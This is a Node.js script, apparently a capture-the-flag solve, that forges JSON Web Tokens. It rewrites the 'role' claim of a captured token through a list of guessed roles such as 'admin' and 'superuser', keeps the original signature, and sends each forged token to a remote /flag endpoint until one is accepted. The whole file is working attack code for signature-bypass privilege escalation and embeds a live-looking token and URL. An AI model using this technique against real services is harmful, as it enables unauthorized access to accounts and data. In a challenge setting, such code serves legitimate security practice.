const jwt = require("jsonwebtoken");
const axios = require("axios");

const originalJwt =
  "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InBhd3MiLCJyb2xlIjoidHdpY2VfaHVza3kiLCJleHAiOjE3Mzk1OTE5NjksImlhdCI6MTczODk4NzE2OX0.H-fLIpYuzBUJhP-cfd8R6dRxZiYVEYXVVvdVmOMTRjc";

const url = "https://gg5z5bfszbqojno7wae76xr4ze0pyufg.lambda-url.us-east-1.on.aws/flag";

// Base64 decode JWT payload (middle part)
function decodeBase64Url(base64Url) {
  return Buffer.from(base64Url, "base64").toString();
}

// Extract original payload & header
const [headerB64, payloadB64, signature] = originalJwt.split(".");
const payload = JSON.parse(decodeBase64Url(payloadB64));

// Generate JWT with modified payload
const testRoles = async () => {
  const roleVariations = [
    "single_husky",
    "admin",
    "debug",
    "superuser",
    "alpha_husky",
    "big_paws",
    "pack_leader",
    "wolf",
    "paws_master",
    "master_husky",
  ];

  for (const role of roleVariations) {
    payload.role = role;

    // Re-encode payload
    const newPayloadB64 = Buffer.from(JSON.stringify(payload))
      .toString("base64")
      .replace(/=/g, "")
      .replace(/\+/g, "-")
      .replace(/\//g, "_");

    const newJwt = `${headerB64}.${newPayloadB64}.${signature}`;

    try {
      const response = await axios.get(url, {
        headers: { Authorization: `Bearer ${newJwt}` },
      });

      console.log(`Trying role: ${role}`);
      console.log(`Response: ${JSON.stringify(response.data, null, 2)}\n`);

      if (response.data.toLowerCase().includes("flag")) {
        console.log(`🎉 SUCCESS! Flag found with role: ${role}`);
        break;
      }
    } catch (error) {
      console.log(`Trying role: ${role}`);
      if (error.response) {
        console.log(`Error: ${JSON.stringify(error.response.data, null, 2)}\n`);
      } else {
        console.log(`Error: ${error.message}\n`);
      }
    }
  }
};

// Run the script
testRoles();
